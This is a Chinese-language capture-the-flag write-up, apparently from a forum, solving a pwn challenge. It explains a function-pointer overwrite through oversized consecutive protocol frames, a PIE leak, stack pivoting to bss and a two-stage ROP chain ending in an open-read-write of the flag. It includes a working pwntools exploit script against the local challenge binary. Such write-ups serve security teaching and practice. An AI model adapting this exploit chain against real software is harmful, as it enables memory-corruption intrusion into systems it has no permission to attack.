
也就是说如果我们发送的是连续帧,且长度超过`0x100`,就会覆盖原本的函数指针

## 攻击

由于程序开启了所有保护,且不存在后门函数,我们无法一下子跳转到确定的目标
但我们知道,程序开启了沙箱,禁止了`execve`类的函数调用,我们的最终手段一定是`orw`
`orw`需要我们连续执行函数并控制参数,只有`ROP`能做到这一点
由于不存在栈溢出,我们又必须要进行栈迁移才能达成`ROP`

```
.text:00000000000016E0 ; int puts_()
.text:00000000000016E0 _puts_ proc near ; DATA XREF: Init+2A↓o
.text:00000000000016E0 ; __unwind {
.text:00000000000016E0 endbr64
.text:00000000000016E4 lea rdi, aCbDefaultHandl ; "[cb] default handler."
.text:00000000000016EB jmp _puts
.text:00000000000016EB ; } // starts at 16E0
.text:00000000000016EB _puts_ endp
```

最开始的`handle`函数是这个,打印一句话并返回
如果我们将函数指针最低字节从`E0`偏移到`E4`,就可能导致`rdi`中的内容出现非预期
通过调试可知,这样会泄露出我们刚刚输入的连续帧数据,如果这里面不存在`\x00`截断的话,还可以泄露出`handle`指针,也就是说我们可以泄露`PIE`
![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_4Y5CG28VG2DVN74.webp)
此时我们可以正常返回`main`中 , 可以再次修改函数指针
此时`text`段的`gadget`都可以拿来用,可以先使用`ROPgadget`寻找合适的片段
![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_CH4TUH9NQQ4UHKY.webp)
一个很醒目的特色`gadget`,很明显可以用来栈迁移.
再结合之前说的,执行`handle`函数时,`rdi`为`buf`上的输入的起始地址,一切就都通了
我们可以将`handle`覆盖为这个`gadget`,将栈迁移到`bss`上,在前`0x100`字节布置好泄露`libc`的`ROP`+`二次注入ROP`的`ROP`
即可执行任意长度的`ROP`链

## EXP

```
from pwn import *
io=process('./pwn')
def bug():
    gdb.attach(io)
    io.sendlineafter(b"Enter magic number:",b"12803159")
    io.recvuntil(b"> bad format.")
def s(data):
    mode=0x10
    payloads=[]
    if len(data) <=7:
        pci=bytes([len(data)])
        frame=pci+data
        payloads.append(frame)
    else:
        total_len=len(data)
        pci=bytes([0x10|((total_len>>8)&0xF)])+bytes([total_len&0xFF])
        ff_data=data[:6]
        payloads.append(pci+ff_data)
        data=data[6:]
        seq=1
        while data:
            chunk=data[:7]
            data=data[7:]
            pci=bytes([0x20|(seq&0xF)])
            cf=pci+chunk
            payloads.append(cf)
            seq=(seq+1)&0xF
            if seq==0:
                seq=1
    for frame in payloads:
        hex_part=frame.hex().upper()
        line=f"{mode:X}#{hex_part}".encode()
        io.sendlineafter(b"> ",line)
        print("[Send]",line)
s(b"\xAA"*0x100+p8(0XEB))
io.recvuntil(b"\xaa"*0x100)
base=u64(io.recv(6)+b'\x00'*2)-0x16EB
print(hex(base))
io.sendline("reset")
rdi=base+0x0000000000001557
rsi=base+0x0000000000001555
#rdx
rop=p64(rdi)+p64(base+0x3F68)+p64(base+0x1160)+p64(rdi)+p64(base+0x615b)+p64(rsi)+p64(base+0x6060+0x50-8)*2+p64(rdi+1)+p64(base+0x11A0)
s(p64(rdi+1)+rop.ljust(0xe8,b'\x00')+b"\x00\x00\x00%s\x00\x00\x00"+p64(base+0x12d3)) #使用scanf("%s",buf)实现二次注入
io.recvuntil(b"> ")
pie=base
base=u64(io.recv(6)+b'\x00\x00')-0x19ca40
print(hex(base))
orw=b"./flag"
orw+=...
io.sendline(orw)
io.interactive()
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
最后于 2025-10-31 10:32
被zer00ne编辑，原因：
[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
上传的附件：
- [强网杯.7z](javascript:void(0);)
  （1.13MB，20次下载）
- [强网拟态.7z](javascript:void(0);)
  （842.79kb，18次下载）
